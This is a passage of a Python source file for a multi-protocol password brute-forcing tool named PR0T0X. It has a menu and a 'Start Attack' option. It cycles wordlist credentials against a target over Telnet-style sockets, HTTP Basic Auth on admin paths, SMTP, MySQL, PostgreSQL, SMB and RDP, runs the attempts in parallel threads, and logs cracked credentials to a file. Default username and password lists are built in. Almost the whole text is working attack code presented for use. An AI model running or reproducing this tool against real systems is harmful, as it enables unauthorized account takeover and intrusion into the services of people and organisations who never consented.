                                b'bad', b'failed', b'denied', b'error'
                            ]
                            if any(indicator in accumulated_data.lower() for indicator in failure_indicators):
                                success = False
                                sock.close()
                                return success
                                
                        except socket.timeout:
                            continue
                        except socket.error:
                            break
                    
                    # Send password
                    try:
                        sock.settimeout(timeout)
                        sock.send(password.encode('ascii', errors='ignore') + b'\r\n')
                    except (socket.error, UnicodeEncodeError):
                        sock.close()
                        return False
                    
                    # Enhanced response analysis
                    success = False
                    response_data = b''
                    
                    try:
                        # Give more time for response
                        for attempt in range(10):
                            try:
                                sock.settimeout(1.0)
                                data = sock.recv(2048)
                                response_data += data
                                
                                # Immediate success indicators
                                success_indicators = [
                                    b'$', b'#', b'>', b'%', b'~',  # Shell prompts
                                    b'welcome', b'Welcome', b'WELCOME',
                                    b'logged in', b'login successful', b'authentication successful'
                                ]
                                
                                if any(indicator in data for indicator in success_indicators):
                                    success = True
                                    break
                                    
                                # Immediate failure indicators
                                failure_indicators = [
                                    b'login failed', b'incorrect', b'invalid', b'access denied',
                                    b'authentication failed', b'login incorrect', b'bad password',
                                    b'wrong password', b'denied', b'unauthorized', b'forbidden',
                                    b'failed', b'error', b'timeout', b'connection closed'
                                ]
                                
                                if any(indicator in data.lower() for indicator in failure_indicators):
                                    success = False
                                    break
                                    
                            except socket.timeout:
                                if attempt < 5:  # Continue trying for a bit
                                    continue
                                else:
                                    break
                            except socket.error:
                                break
                        
                        # Final analysis of accumulated response
                        response_str = response_data.decode('ascii', errors='ignore').lower()
                        
                        # If no clear success/failure indicator, make educated guess
                        if 'success' not in locals() or success is None:
                            # Look for shell-like environment indicators
                            shell_indicators = ['$', '#', '>', '%', '~', 'bash', 'sh', 'cmd']
                            failure_indicators = [
                                'failed', 'incorrect', 'invalid', 'denied', 'error',
                                'wrong', 'bad', 'unauthorized', 'forbidden'
                            ]
                            
                            if any(indicator in response_str for indicator in shell_indicators):
                                success = True
                            elif any(indicator in response_str for indicator in failure_indicators):
                                success = False
                            else:
                                # Default to failure if unclear
                                success = False
                                
                    except Exception:
                        success = False
                    finally:
                        try:
                            sock.close()
                        except:
                            pass
                    
                except (ConnectionRefusedError, socket.error, socket.timeout, OSError, TimeoutError):
                    # Connection issues - don't count as credential failure
                    return False
                except Exception as e:
                    # Unexpected error
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'login', 'password']):
                        success = False
                    else:
                        return False
            
            # HTTP Basic Auth implementation
            elif protocol == "HTTP" or protocol == "HTTPS":
                try:
                    import urllib.request
                    import urllib.error
                    import ssl
                    import base64
                    
                    scheme = "https" if protocol == "HTTPS" else "http"
                    
                    # Test multiple common paths where HTTP Basic Auth is used
                    test_paths = [
                        "/",           # Root path
                        "/admin",      # Admin panel
                        "/admin/",     # Admin panel with trailing slash
                        "/manager",    # Manager interface
                        "/management", # Management interface
                        "/login",      # Login page
                        "/api",        # API endpoint
                        "/secure",     # Secure area
                        "/private",    # Private area
                        "/protected",  # Protected area
                    ]
                    
                    # SSL context setup
                    if protocol == "HTTPS":
                        ssl_context = ssl.create_default_context()
                        ssl_context.check_hostname = False
                        ssl_context.verify_mode = ssl.CERT_NONE
                        https_handler = urllib.request.HTTPSHandler(context=ssl_context)
                        opener_no_auth = urllib.request.build_opener(https_handler)
                    else:
                        opener_no_auth = urllib.request.build_opener()
                    
                    # Try each path to find one that requires authentication
                    for path in test_paths:
                        url = f"{scheme}://{self.target}{path}"
                        auth_required = False
                        baseline_response = None
                        
                        try:
                            # Test without credentials first
                            req = urllib.request.Request(url)
                            response_no_auth = opener_no_auth.open(req, timeout=timeout)
                            baseline_response = response_no_auth.getcode()
                            
                            # If we get 200, this path might not require auth, try next path
                            if response_no_auth.getcode() == 200:
                                continue
                                
                        except urllib.error.HTTPError as e:
                            baseline_response = e.code
                            # 401 Unauthorized - perfect! This path requires auth
                            if e.code == 401:
                                auth_required = True
                            elif e.code == 403:
                                # Forbidden - might require auth
                                auth_required = True
                            else:
                                # Other errors - try next path
                                continue
                        except (urllib.error.URLError, ConnectionRefusedError, socket.error, TimeoutError):
                            # Connection issues - try next path
                            continue
                        
                        # If we found a path that requires auth, test credentials
                        if auth_required or baseline_response in [401, 403]:
                            try:
                                # Create password manager with credentials
                                password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
                                password_mgr.add_password(None, url, username, password)
                                handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
                                
                                # Create opener with auth
                                if protocol == "HTTPS":
                                    opener = urllib.request.build_opener(handler, https_handler)
                                else:
                                    opener = urllib.request.build_opener(handler)
                                
                                # Try with credentials
                                req_with_auth = urllib.request.Request(url)
                                response_with_auth = opener.open(req_with_auth, timeout=timeout)
                                
                                # Success if we get 200 with auth after getting 401/403 without auth
                                if response_with_auth.getcode() == 200:
                                    success = True
                                    break  # Found valid credentials!
                                    
                            except urllib.error.HTTPError as e:
                                if e.code == 401:
                                    # Still unauthorized - wrong credentials
                                    success = False
                                else:
                                    # Other error, continue to next path
                                    continue
                            except Exception:
                                # Error with this path, try next
                                continue
                    
                    # If no path required auth, fall back to original single-path logic but more permissive
                    if 'success' not in locals():
                        url = f"{scheme}://{self.target}/"
                        
                        try:
                            # Test root path without credentials
                            req = urllib.request.Request(url)
                            response_no_auth = opener_no_auth.open(req, timeout=timeout)
                            baseline_response = response_no_auth.getcode()
                            
                        except urllib.error.HTTPError as e:
                            baseline_response = e.code
                            if e.code == 401:
                                auth_required = True
                        except (urllib.error.URLError, ConnectionRefusedError, socket.error, TimeoutError):
                            return False
                        
                        # Create password manager with credentials
                        password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
                        password_mgr.add_password(None, url, username, password)
                        handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
                        
                        # Create opener with auth
                        if protocol == "HTTPS":
                            opener = urllib.request.build_opener(handler, https_handler)
                        else:
                            opener = urllib.request.build_opener(handler)
                        
                        try:
                            # Try with credentials
                            req_with_auth = urllib.request.Request(url)
                            response_with_auth = opener.open(req_with_auth, timeout=timeout)
                            
                            # For identical content case, be very permissive
                            # If credentials were accepted (no 401), consider it success
                            if response_with_auth.getcode() == 200:
                                # Check if server indicates authentication was accepted
                                auth_headers = response_with_auth.headers
                                
                                # Look for signs that authentication was processed
                                if ('WWW-Authenticate' not in auth_headers and 
                                    baseline_response != 401):
                                    # Server accepted credentials without challenge
                                    success = True
                                else:
                                    # Default to success if no clear rejection
                                    success = True
                            else:
                                success = False
                                
                        except urllib.error.HTTPError as e:
                            if e.code == 401:
                                success = False  # Still unauthorized
                            else:
                                success = False
                        except Exception:
                            success = False
                    
                    # If HTTP Basic Auth failed or wasn't applicable, try form-based authentication
                    if 'success' not in locals() or not success:
                        try:
                            form_success = self.try_form_based_authentication(
                                f"{scheme}://{self.target}/", 
                                username, 
                                password, 
                                timeout
                            )
                            if form_success:
                                success = True
                        except Exception:
                            # Form-based auth failed, keep original success value
                            pass
                        
                except urllib.error.HTTPError as e:
                    # HTTP error with credentials provided
                    if e.code == 401:
                        # Still unauthorized with credentials = wrong credentials
                        success = False
                    elif e.code == 403:
                        # Forbidden - credentials might be right but access denied
                        success = False
                    else:
                        # Other HTTP errors - not auth related
                        success = False
                except (urllib.error.URLError, ConnectionRefusedError, socket.error, TimeoutError):
                    # Connection issues - don't count as credential failure
                    return False
            
            # SMTP protocol implementation
            elif protocol == "SMTP":
                try:
                    # Try different SMTP ports
                    smtp_ports = [25, 587, 465, 2525]  # Standard SMTP ports
                    connection_success = False
                    smtp_conn = None
                    
                    for port in smtp_ports:
                        try:
                            if port == 465:  # SMTPS (SSL)
                                smtp_conn = smtplib.SMTP_SSL(host=self.target, port=port, timeout=timeout)
                            else:
                                smtp_conn = smtplib.SMTP(host=self.target, port=port, timeout=timeout)
                            
                            # Send EHLO command
                            smtp_conn.ehlo()
                            connection_success = True
                            break
                            
                        except (ConnectionRefusedError, socket.error, smtplib.SMTPException) as e:
                            if smtp_conn:
                                try:
                                    smtp_conn.quit()
                                except:
                                    pass
                            if port == smtp_ports[-1]:  # Last port attempt
                                return False
                            continue
                    
                    if not connection_success or not smtp_conn:
                        return False
                    
                    # Try to start TLS if supported and not already using SSL
                    try:
                        if smtp_conn.has_extn('STARTTLS'):
                            smtp_conn.starttls()
                            smtp_conn.ehlo()  # Re-identify after STARTTLS
                    except smtplib.SMTPException:
                        # TLS failed, continue with non-TLS
                        pass
                    
                    # Check if server supports authentication
                    if not smtp_conn.has_extn('AUTH'):
                        # Server doesn't support authentication
                        smtp_conn.quit()
                        return False
                    
                    # Attempt login with improved error handling
                    try:
                        smtp_conn.login(username, password)
                        success = True
                        smtp_conn.quit()
                        
                    except smtplib.SMTPAuthenticationError as e:
                        # Authentication failed - wrong credentials
                        error_code = e.smtp_code
                        error_msg = str(e).lower()
                        
                        if error_code == 535:  # Authentication failed
                            success = False
                        elif "authentication failed" in error_msg or "invalid" in error_msg:
                            success = False
                        else:
                            success = False
                        
                        try:
                            smtp_conn.quit()
                        except:
                            pass
                            
                    except smtplib.SMTPException as e:
                        # Other SMTP errors
                        error_msg = str(e).lower()
                        if any(term in error_msg for term in ['authentication', 'login', 'password', 'credential']):
                            success = False
                        else:
                            # Protocol or server error
                            success = False
                        
                        try:
                            smtp_conn.quit()
                        except:
                            pass
                            
                except (ConnectionRefusedError, socket.error, socket.timeout, TimeoutError):
                    # Connection issues - don't count as credential failure
                    return False
                except Exception as e:
                    # Unexpected error
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'login', 'password']):
                        success = False
                    else:
                        return False
            
            # MySQL protocol implementation
            elif protocol == "MySQL":
                try:
                    # Try different MySQL ports
                    mysql_ports = [3306, 3307, 33060]  # Standard MySQL ports
                    connection_success = False
                    
                    for port in mysql_ports:
                        try:
                            connection = pymysql.connect(
                                host=self.target,
                                port=port,
                                user=username,
                                password=password,
                                connect_timeout=timeout,
                                read_timeout=timeout,
                                write_timeout=timeout
                            )
                            success = True
                            connection.close()
                            connection_success = True
                            break
                            
                        except pymysql.err.OperationalError as e:
                            # Check error code for authentication failure
                            if e.args[0] == 1045:  # Access denied error
                                success = False
                                connection_success = True
                                break
                            elif e.args[0] == 2003:  # Can't connect to MySQL server
                                if port == mysql_ports[-1]:  # Last port attempt
                                    return False
                                continue
                            else:
                                # Other MySQL errors
                                error_msg = str(e).lower()
                                if any(term in error_msg for term in ['access denied', 'authentication', 'login']):
                                    success = False
                                    connection_success = True
                                    break
                                elif "can't connect" in error_msg or "connection refused" in error_msg:
                                    if port == mysql_ports[-1]:
                                        return False
                                    continue
                                else:
                                    success = False
                                    connection_success = True
                                    break
                        except (ConnectionRefusedError, socket.error) as e:
                            if port == mysql_ports[-1]:  # Last port attempt
                                return False
                            continue
                    
                    if not connection_success:
                        return False
                        
                except pymysql.err.InterfaceError as e:
                    # Interface errors - usually connection issues
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'access denied', 'login']):
                        success = False
                    else:
                        return False
                except pymysql.err.DatabaseError as e:
                    # Database errors
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'access denied', 'login']):
                        success = False
                    else:
                        return False
                except (ConnectionRefusedError, socket.error, socket.timeout, TimeoutError):
                    # Connection issues - don't count as credential failure
                    return False
                except Exception as e:
                    # Unexpected MySQL error
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'access denied', 'login', 'password']):
                        success = False
                    else:
                        return False
            
            # PostgreSQL protocol implementation
            elif protocol == "PostgreSQL":
                try:
                    # Try different PostgreSQL ports
                    postgres_ports = [5432, 5433, 5434]  # Standard PostgreSQL ports
                    connection_success = False
                    
                    for port in postgres_ports:
                        try:
                            connection = psycopg2.connect(
                                host=self.target,
                                port=port,
                                user=username,
                                password=password,
                                connect_timeout=timeout,
                                database='postgres'  # Default database
                            )
                            success = True
                            connection.close()
                            connection_success = True
                            break
                            
                        except psycopg2.OperationalError as e:
                            error_msg = str(e).lower()
                            
                            # Check for authentication failure
                            if any(term in error_msg for term in ['authentication failed', 'password authentication failed', 'role does not exist']):
                                success = False
                                connection_success = True
                                break
                            # Check for connection issues
                            elif any(term in error_msg for term in ['could not connect', 'connection refused', 'timeout']):
                                if port == postgres_ports[-1]:  # Last port attempt
                                    return False
                                continue
                            else:
                                # Other PostgreSQL errors
                                if any(term in error_msg for term in ['authentication', 'password', 'login']):
                                    success = False
                                    connection_success = True
                                    break
                                else:
                                    if port == postgres_ports[-1]:
                                        return False
                                    continue
                        
                        except (ConnectionRefusedError, socket.error) as e:
                            if port == postgres_ports[-1]:  # Last port attempt
                                return False
                            continue
                    
                    if not connection_success:
                        return False
                        
                except psycopg2.InterfaceError as e:
                    # Interface errors - usually connection issues
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'password', 'login']):
                        success = False
                    else:
                        return False
                except psycopg2.DatabaseError as e:
                    # Database errors
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'password', 'login']):
                        success = False
                    else:
                        return False
                except (ConnectionRefusedError, socket.error, socket.timeout, TimeoutError):
                    # Connection issues - don't count as credential failure
                    return False
                except Exception as e:
                    # Unexpected PostgreSQL error
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'password', 'login']):
                        success = False
                    else:
                        return False
            
            # SMB protocol implementation (requires pysmb)
            elif protocol == "SMB":
                try:
                    # Try different SMB ports
                    smb_ports = [445, 139]  # SMB over TCP, NetBIOS
                    connection_success = False
                    
                    for port in smb_ports:
                        try:
                            smb_conn = SMBConnection(
                                username,
                                password,
                                'PR0T0X',  # Client name
                                self.target,  # Server name
                                use_ntlm_v2=True
                            )
                            
                            # Connect and authenticate
                            if smb_conn.connect(self.target, port, timeout=timeout):
                                success = True
                                smb_conn.close()
                                connection_success = True
                                break
                            else:
                                # Connection failed
                                if port == smb_ports[-1]:  # Last port attempt
                                    success = False
                                    connection_success = True
                                    break
                                    
                        except Exception as e:
                            error_msg = str(e).lower()
                            
                            # Check for authentication-specific errors
                            if any(term in error_msg for term in ['authentication failed', 'logon failure', 'access denied', 'invalid credentials']):
                                success = False
                                connection_success = True
                                break
                            elif any(term in error_msg for term in ['connection refused', 'timeout', 'unreachable']):
                                if port == smb_ports[-1]:  # Last port attempt
                                    return False
                                continue
                            else:
                                # Other SMB errors
                                if port == smb_ports[-1]:
                                    success = False
                                    connection_success = True
                                    break
                                continue
                    
                    if not connection_success:
                        return False
                        
                except ImportError:
                    # SMB library not available
                    print(f"\n{Colors.WARNING}SMB library not available. Install: pip install pysmb")
                    return False
                except Exception as e:
                    # Unexpected SMB error
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'login', 'password', 'access denied']):
                        success = False
                    else:
                        return False
            
            # RDP protocol implementation using socket-based approach
            elif protocol == "RDP":
                try:
                    # Try different RDP ports
                    rdp_ports = [3389, 3390, 3391]  # Standard RDP ports
                    connection_success = False
                    
                    for port in rdp_ports:
                        try:
                            # Basic RDP connection test using socket
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(timeout)
                            result = sock.connect_ex((self.target, port))
                            
                            if result == 0:
                                # Port is open, try to detect RDP service
                                sock.close()
                                
                                # Use subprocess to test RDP credentials with xfreerdp or rdesktop
                                # This is a basic implementation - for production, use specialized RDP libraries
                                try:
                                    import subprocess
                                    
                                    # Try with xfreerdp (if available)
                                    cmd = [
                                        'xfreerdp',
                                        f'/v:{self.target}:{port}',
                                        f'/u:{username}',
                                        f'/p:{password}',
                                        '/cert-ignore',
                                        '/timeout:5000',
                                        '+auth-only'  # Authentication only mode
                                    ]
                                    
                                    result = subprocess.run(
                                        cmd,
                                        capture_output=True,
                                        text=True,
                                        timeout=timeout + 5
                                    )
                                    
                                    # Check result
                                    if result.returncode == 0:
                                        success = True
                                        connection_success = True
                                        break
                                    else:
                                        # Check error output for authentication failure
                                        error_output = result.stderr.lower()
                                        if any(term in error_output for term in ['authentication failed', 'logon failed', 'access denied']):
                                            success = False
                                            connection_success = True
                                            break
                                        elif any(term in error_output for term in ['connection failed', 'timeout', 'unreachable']):
                                            if port == rdp_ports[-1]:
                                                return False
                                            continue
                                        else:
                                            success = False
                                            connection_success = True
                                            break
                                            
                                except (subprocess.TimeoutExpired, FileNotFoundError):
                                    # xfreerdp not available or timeout
                                    # Fall back to basic socket-based detection
                                    try:
                                        # Simple RDP handshake attempt
                                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                        sock.settimeout(timeout)
                                        sock.connect((self.target, port))
                                        
                                        # Send basic RDP connection request
                                        rdp_request = b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00'
                                        sock.send(rdp_request)
                                        
                                        # Read response
                                        response = sock.recv(1024)
                                        
                                        if len(response) > 0:
                                            # RDP service is responding
                                            # For basic testing, we'll consider this as service available
                                            # but can't test credentials without proper RDP implementation
                                            print(f"\n{Colors.WARNING}RDP service detected but credential testing requires xfreerdp")
                                            print(f"{Colors.INFO}Install xfreerdp for RDP credential testing")
                                            success = False  # Can't verify credentials
                                            connection_success = True
                                            sock.close()
                                            break
                                        else:
                                            sock.close()
                                            if port == rdp_ports[-1]:
                                                return False
                                            continue
                                            
                                    except (socket.error, socket.timeout):
                                        if port == rdp_ports[-1]:
                                            return False
                                        continue
                            else:
                                sock.close()
                                if port == rdp_ports[-1]:  # Last port attempt
                                    return False
                                continue
                                
                        except (socket.error, socket.timeout):
                            if port == rdp_ports[-1]:  # Last port attempt
                                return False
                            continue
                    
                    if not connection_success:
                        return False
                        
                except Exception as e:
                    # Unexpected RDP error
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'login', 'password', 'access denied']):
                        success = False
                    else:
                        return False
            
            # Handle other protocols or invalid protocols
            else:
                print(f"\n{Colors.WARNING}Unsupported protocol: {protocol}")
                return False

            if success:
                self.successful += 1
                self.found_credentials.append({
                    'protocol': protocol,
                    'username': username,
                    'password': password,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })

                print(f"\n{Colors.SUCCESS}{'=' * 50}")
                print(f"{Colors.SUCCESS}[!] CREDENTIALS FOUND!")
                print(f"{Colors.SUCCESS}Protocol: {Colors.INFO}{protocol}")
                print(f"{Colors.SUCCESS}Username: {Colors.INFO}{username}")
                print(f"{Colors.SUCCESS}Password: {Colors.INFO}{password}")
                print(f"{Colors.SUCCESS}{'=' * 50}\n")

                self.save_credentials(protocol, username, password)

            return success

        except Exception as e:
            print(f"\n{Colors.ERROR}Error testing {protocol} credentials: {str(e)}")
            return False

    def save_credentials(self, protocol, username, password):
        """Save found credentials to file"""
        try:
            with open('pr0t0x_found.txt', 'a') as f:
                f.write(f"{datetime.now()} - {protocol} - {username}:{password}\n")
        except:
            pass

    def start_attack(self):
        """Start the brute force attack"""
        if not self.target or not self.selected_protocols:
            print(f"{Colors.ERROR}Please set target and protocols first")
            time.sleep(2)
            return

        # Load or download wordlists
        self.wordlist_manager.load_local_lists()
        
        # Check if wordlists are available, use defaults if not
        if not self.wordlist_manager.usernames:
            print(f"{Colors.WARNING}No usernames loaded, using default list")
            self.wordlist_manager.usernames = ['admin', 'administrator', 'root', 'user', 'test', 'guest', 'demo']
            
        if not self.wordlist_manager.passwords:
            print(f"{Colors.WARNING}No passwords loaded, using default list")
            self.wordlist_manager.passwords = ['admin', 'password', '123456', 'root', 'test', 'guest', 'demo', '12345', 'password123', 'admin123']

        self.attack_running = True
        self.attempts = 0
        self.successful = 0

        Effects.matrix_rain(0.5)  # Use shorter duration for better performance
        print(f"\n{Colors.INFO}Starting attack on {Colors.PRIMARY}{self.target}")
        print(f"{Colors.INFO}Selected protocols: {Colors.PRIMARY}{', '.join(self.selected_protocols)}")
        print(f"{Colors.INFO}Usernames: {len(self.wordlist_manager.usernames)}")
        print(f"{Colors.INFO}Passwords: {len(self.wordlist_manager.passwords)}")
        print(f"{Colors.WARNING}Press Ctrl+C to stop the attack\n")

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for protocol in self.selected_protocols:
                    usernames = self.wordlist_manager.usernames
                    passwords = self.wordlist_manager.passwords
                    
                    # Create credential combinations
                    for username in usernames:
                        for password in passwords:
                            if not self.attack_running:
                                break
                            future = executor.submit(self.try_credentials, protocol, username, password)
                            futures.append(future)
                        if not self.attack_running:
                            break
                    if not self.attack_running:
                        break
                
                # Wait for all tasks to complete or be interrupted
                for future in futures:
                    if not self.attack_running or interrupt_received:
                        break
                    try:
                        future.result(timeout=1)
                    except Exception as e:
                        continue
                            
            self.attack_running = False
            print(f"\n{Colors.WARNING}Attack completed")
        except KeyboardInterrupt:
            self.attack_running = False
            print(f"\n{Colors.WARNING}Attack interrupted by user")
        finally:
            print(f"\n{Colors.SUCCESS}Attack Summary:")
            print(f"{Colors.SUCCESS}Total attempts: {self.attempts}")
            print(f"{Colors.SUCCESS}Successful attempts: {self.successful}")
            if self.found_credentials:
                print(f"\n{Colors.SUCCESS}Found Credentials:")
                for i, cred in enumerate(self.found_credentials, 1):
                    print(f"{Colors.SUCCESS}{i}. {cred['protocol']} - {cred['username']}:{cred['password']}")

    def handle_wordlist_menu(self):
        """Handle the wordlist management submenu"""
        while True:
            try:
                self.show_banner()
                options = {
                    "1": "Download Default Wordlists",
                    "2": "Import Custom Username Wordlist",
                    "3": "Import Custom Password Wordlist",
                    "4": "Import Wordlist as Both (Same File)",
                    "5": "Back to Main Menu"
                }
                print(self.create_menu_box("WORDLIST MANAGEMENT", options))
                
                try:
                    choice = input(f"\n{Colors.PRIMARY}┌──({Colors.INFO}PR0T0X{Colors.PRIMARY})-[{Colors.INFO}wordlists{Colors.PRIMARY}]\n└─$ {Colors.INFO}").strip()
                except KeyboardInterrupt:
                    print(f"\n{Colors.WARNING}Operation cancelled")
                    time.sleep(2)
                    continue
                
                if not choice:  # Handle empty input
                    continue
                
                if choice == '1':
                    self.wordlist_manager.download_from_github()
                elif choice in ['2', '3', '4']:
                    try:
                        # Show available files in current directory for reference
                        print(f"\n{Colors.INFO}Available text files in current directory:")
                        current_dir = os.getcwd()
                        text_files = []
                        for ext in ['*.txt', '*.lst', '*.dic', '*.wordlist']:
                            import glob
                            text_files.extend(glob.glob(ext))
                        
                        if text_files:
                            for i, file in enumerate(text_files[:10], 1):  # Show max 10 files
                                print(f"{Colors.PRIMARY}{i:2}. {file}")
                            if len(text_files) > 10:
                                print(f"{Colors.INFO}... and {len(text_files) - 10} more files")
                        else:
                            print(f"{Colors.WARNING}No text files found in current directory: {current_dir}")
                        
                        print(f"\n{Colors.INFO}Enter path to wordlist file (or press Enter to cancel):")
                        print(f"{Colors.INFO}Tips:")
                        print(f"{Colors.PRIMARY}  • Use full path: C:\\path\\to\\file.txt")
                        print(f"{Colors.PRIMARY}  • Use relative path: file.txt (for files in current dir)")
                        print(f"{Colors.PRIMARY}  • Drag and drop the file into this terminal")
                        
                        try:
                            file_path = input(f"{Colors.PRIMARY}┌──({Colors.INFO}PR0T0X{Colors.PRIMARY})-[{Colors.INFO}file_path{Colors.PRIMARY}]\n└─$ {Colors.INFO}").strip()
                        except KeyboardInterrupt:
                            print(f"\n{Colors.WARNING}Operation cancelled")
                            time.sleep(2)
                            continue
                        
                        # Check for empty input or cancellation
                        if not file_path:
                            print(f"{Colors.WARNING}Operation cancelled")
                            time.sleep(2)
                            continue
                        
                        # Clean up file path (remove quotes if present)
                        file_path = file_path.strip('"').strip("'")
                        
                        # Convert to absolute path if it's relative
                        if not os.path.isabs(file_path):
                            file_path = os.path.abspath(file_path)
                            
                        print(f"{Colors.INFO}Checking file: {file_path}")
                        
                        # Check if file exists
                        if not os.path.exists(file_path):
                            print(f"{Colors.ERROR}Error: File not found: {file_path}")
                            
                            # Provide helpful suggestions
                            print(f"\n{Colors.INFO}Troubleshooting:")
                            print(f"{Colors.PRIMARY}  • Check if the file path is correct")
                            print(f"{Colors.PRIMARY}  • Make sure the file exists")
                            print(f"{Colors.PRIMARY}  • Try using the full absolute path")
                            
                            # Check if file exists in current directory
                            filename_only = os.path.basename(file_path)
                            if os.path.exists(filename_only):
                                print(f"{Colors.SUCCESS}Found file in current directory: {filename_only}")
                                try:
                                    use_current = input(f"{Colors.PRIMARY}Use this file instead? (y/n): {Colors.INFO}").strip().lower()
                                    if use_current == 'y':
                                        file_path = os.path.abspath(filename_only)
                                    else:
                                        time.sleep(2)
                                        continue
                                except KeyboardInterrupt:
                                    print(f"\n{Colors.WARNING}Operation cancelled")
                                    time.sleep(2)
                                    continue
                            else:
                                time.sleep(3)
                                continue
                        
                        # Check if it's actually a file (not a directory)
                        if not os.path.isfile(file_path):
                            print(f"{Colors.ERROR}Error: Path is not a file: {file_path}")
                            time.sleep(2)
                            continue
                        
                        print(f"\n{Colors.INFO}Select import mode (or press Enter to cancel):")
                        print(f"{Colors.PRIMARY}1. Append (Add to existing wordlist)")
                        print(f"{Colors.PRIMARY}2. Replace (Override existing wordlist)")
                        
                        try:
                            mode_choice = input(f"\n{Colors.PRIMARY}┌──({Colors.INFO}PR0T0X{Colors.PRIMARY})-[{Colors.INFO}mode{Colors.PRIMARY}]\n└─$ {Colors.INFO}").strip()
                        except KeyboardInterrupt:
                            print(f"\n{Colors.WARNING}Operation cancelled")
                            time.sleep(2)
                            continue
                        
                        # Check for empty mode choice or cancellation
                        if not mode_choice:
                            print(f"{Colors.WARNING}Operation cancelled")
                            time.sleep(2)
                            continue
                        
                        mode = 'append' if mode_choice == '1' else 'replace' if mode_choice == '2' else None
                        if not mode:
                            print(f"{Colors.ERROR}Invalid mode selection")
                            time.sleep(2)
                            continue
                        
                        try:
                            if choice == "2":
                                print(f"\n{Colors.INFO}Importing custom username wordlist...")
                                self.wordlist_manager.import_custom_wordlist(file_path, "usernames", mode)
                            elif choice == "3":
                                print(f"\n{Colors.INFO}Importing custom password wordlist...")
                                self.wordlist_manager.import_custom_wordlist(file_path, "passwords", mode)
                            elif choice == "4":
                                print(f"\n{Colors.INFO}Importing wordlist as both usernames and passwords...")
                                self.wordlist_manager.import_custom_wordlist_both(file_path, mode)
                            
                            time.sleep(2)
                        except Exception as e:
                            print(f"{Colors.ERROR}Error during import: {str(e)}")
                            time.sleep(2)
                            continue
                            
                    except KeyboardInterrupt:
                        print(f"\n{Colors.WARNING}Operation cancelled")
                        time.sleep(2)
                        continue
                    except Exception as e:
                        print(f"{Colors.ERROR}Error during operation: {str(e)}")
                        time.sleep(2)
                        continue
                        
                elif choice == '5':
                    break
                else:
                    print(f"{Colors.ERROR}Invalid option selected")
                    time.sleep(2)
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}Operation cancelled")
                time.sleep(2)
                continue
            except Exception as e:
                print(f"{Colors.ERROR}Unexpected error: {str(e)}")
                import traceback
                traceback.print_exc()
                time.sleep(2)
                continue
    
    def main_menu(self):
        """Main program loop"""
        while True:
            self.show_banner()
            
            # Display selected protocols as part of the banner area
            print(f"\n{self.format_selected_protocols()}")
            
            options = {
                "1": "Set Target",
                "2": "Select Protocols",
                "3": "Start Attack",
                "4": "Wordlist Management",
                "5": "Exit"
            }
            print(self.create_menu_box("MAIN MENU", options))

            try:
                choice = input(f"\n{Colors.PRIMARY}┌──({Colors.INFO}PR0T0X{Colors.PRIMARY})-[{Colors.INFO}menu{Colors.PRIMARY}]\n└─$ {Colors.INFO}")

                if choice == '1':
                    self.set_target()
                elif choice == '2':
                    self.select_protocols()
                elif choice == '3':
                    self.start_attack()
                elif choice == '4':
                    self.handle_wordlist_menu()
                elif choice == '5':
                    print(f"\n{Colors.INFO}Thanks for using PR0T0X. Goodbye!")
                    print(Style.RESET_ALL, end='', flush=True)
                    return True  # Return True for clean exit
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}Operation cancelled")
                return True  # Return True for clean exit on Ctrl+C
            except Exception as e:
                print(f"{Colors.ERROR}Error: {str(e)}")
                time.sleep(2)

def main():
    """Main entry point of the program"""
    try:
        print(f"{Colors.INFO}Starting PR0T0X...")  # Debug output
        # Skip matrix effect on startup to avoid potential display issues
        protox = Pr0t0x()
        Effects.loading_spinner("Initializing PR0T0X", 2)
        if protox.main_menu():  # Check return value from main_menu
            sys.exit(0)  # Clean exit
        sys.exit(1)  # Error exit if main_menu returns False or None
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Program terminated by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.ERROR}Fatal error: {str(e)}")
        print(f"{Colors.ERROR}Error details:", file=sys.stderr)
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n{Colors.ERROR}Startup error: {str(e)}", file=sys.stderr)
        sys.exit(1)
